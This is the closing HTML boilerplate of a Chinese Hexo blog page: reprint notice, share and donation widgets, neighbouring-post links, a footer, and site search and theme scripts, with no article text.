            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://huyaoyao2019.github.io/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/">http://huyaoyao2019.github.io/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">John Doe</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/07/06/dvwa/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="dvwa">
                        
                        <span class="card-title">dvwa</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-06
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E9%9D%B6%E5%9C%BA/" class="post-category">
                                    web靶场
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="编程语言">
                        
                        <span class="card-title">编程语言</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-05
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-category">
                                    基础知识
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">John Doe</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
